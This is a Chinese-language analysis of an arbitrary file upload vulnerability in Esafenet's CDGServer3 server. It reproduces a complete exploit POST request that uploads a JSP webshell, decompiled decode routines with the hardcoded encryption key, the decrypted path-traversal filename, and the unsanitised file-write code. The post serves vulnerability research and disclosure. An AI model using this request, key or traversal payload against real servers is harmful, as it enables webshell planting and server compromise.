亿赛通 /UploadFileFromClientServiceForClient 任意文件上传漏洞 浅析

**本文主要对QueryString的加解密进行分析，请求传参以及参数处理的问题别人有发过，我就略过了**

EXP情报来自：https://github.com/di0xide-U/YSTupload/blob/main/exp.md

感谢各位大佬的漏洞情报，我也是站在巨人的肩膀上。

根据EXP内容，shell访问地址：https://x.x.x.x/tttT.jsp

    POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
    Host: xxx:8443
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
    Accept: */*
    Content-Length: 1

    shell内容

在这个漏洞中，POST的URL参数
「AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM」

很明显是被亿赛通服务端进行decode后才是真正的恶意代码，而这一串恶意代码也决定了文件的名字以及上传路径，即「/webapps/ROOT/tttT.jsp」，关键在于是亿赛通的decode方法，以及我们如何将恶意代码encode成服务端可识别的字符串。

有幸拿到亿赛通的服务端文件，亿赛通的服务端主要是由JSP和Spring框架组成，核心jar包位于\webapps\CDGServer3\WEB-INF\lib\jhiberest.jar，通过web.xml文件，可以看到漏洞接口所对应的servlet-class路径。


    <servlet>
		<servlet-name>UploadFileFromClientServiceForClient</servlet-name>
		<servlet-class>com.esafenet.servlet.fileManagement.UploadFileFromClientServiceForClient</servlet-class>
    </servlet>

通过反编译jar包，可以看到亿赛通的decode方法，如下图所示，收到Post请求时，对QueryString进行CDGUtil.decode()方法

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    req.setCharacterEncoding("GBK");
    String value_code = req.getQueryString();
    String value_decode = "";
    String[] vds = null;
    value_code = value_code.substring(value_code.indexOf("=") + 1);
    try {
    value_decode = CDGUtil.decode(value_code);
    } catch (Exception e) {
    e.printStackTrace();
} 
```

CDGUtil.decode: 这里面又经过了两个解密函数getTransferUnEncrptString和CodeDecoder.Decode，其中参数key2为密钥，然而密钥是写死在源码里的
```java
public static String decode(String info) throws Exception {
    info = CodeDecoder.getTransferUnEncrptString(info);
    byte[] abyte2 = info.getBytes("ISO8859_1");
    int nLength = Array.getLength(abyte2);
    CodeDecoder.Decode(abyte2, nLength, key2);
    info = new String(abyte2);
    return info;
}
```

getTransferUnEncrptString: 应该是亿赛通自己写的算法，我算法太菜了，脑子过不了，看看就行了
```java
public static String getTransferUnEncrptString(String s)
        throws Exception {
    byte[] abyte0 = s.getBytes("ISO8859_1");
    int nlength = Array.getLength(abyte0);
    byte[] result = new byte[nlength / 2];
    for (int i = 0; i < nlength; i += 2) {
        byte byte_r_lower = abyte0[i];
        byte byte_l_lower = abyte0[i + 1];
        byte_r_lower &= remain_low;
        byte_r_lower <<= 4;
        byte_r_lower &= remain_up;
        byte_l_lower &= remain_low;
        byte_l_lower |= byte_r_lower;
        byte b_singleChar_upper = byte_l_lower;
        result[i / 2] = b_singleChar_upper;
    }

    String unencrptString = new String(result, "ISO8859_1");
    return unencrptString;
}
```

CodeDecoder.Decode: 这里使用了Rijndael_Algorithm算法，好像是类似AES的，密钥**abyte0**是写死在源码里的，可以直接看到
```java
public static void Decode(byte[] abyte1, int nLength, byte[] abyte0)
        throws Exception {
    int groupsLen = 16 * (nLength / 16);
    Object obj = Rijndael_Algorithm.makeKey(abyte0);
    Decrypt(abyte1, abyte1, groupsLen, obj);
    if (groupsLen != nLength) {
        int nLeft = nLength - groupsLen;
        for (int i = 0; i < nLeft; i++)
            abyte1[groupsLen + i] ^= i;

    }
}
```

```java
private static byte key2[] = {
        -21, -112, 90, -68, 5, 44, 85, -86, -21, -112,
        90, -68, 5, 44, 85, -86
}
```

Decrypt:
```java
private static void Decrypt(byte[] in, byte[] result, int n, Object obj)
        throws Exception {
    byte[] abyte = new byte[16];
    byte[] abyte0 = new byte[16];
    if (0 == n)
        return;
    for (int i = 0; i < n / 16; i++) {
        System.arraycopy(in, i * 16, abyte, 0, 16);
        abyte0 = Rijndael_Algorithm.blockDecrypt(abyte, 0, obj);
        System.arraycopy(abyte0, 0, result, i * 16, 16);
    }

}
```

至此，已经完成了字符串的解密，解密大佬的POC之后得到的结果如下:

input: AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM

output:
fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/tttT.jsp

至于如何Encode，各位大佬各显神通，逆向算法可以得出，这里就不多说了。

至于怎么上传，filename参数怎么传过去的，也不放出所有源码了，只看关键代码
```java
ServletInputStream servletInputStream = req.getInputStream();
byte[] buffer = new byte[1024];
File file = new File(Constant.instance.UPLOAD_PATH + fileName);
file.getParentFile().mkdirs();
file.createNewFile();
OutputStream os = new FileOutputStream(file);
int count = 0;
int value = 0;
while ((value = servletInputStream.read(buffer)) != -1) {
    os.write(buffer, 0, value);
    if (++count % 10 == 0)
    os.flush(); 
} 
os.flush();
if (os != null)
    os.close(); 
if (servletInputStream != null)
    servletInputStream.close(); 
```

**Constant.instance.UPLOAD_PATH + fileName** 这里没有处理好，可以将文件上传到服务器的任意位置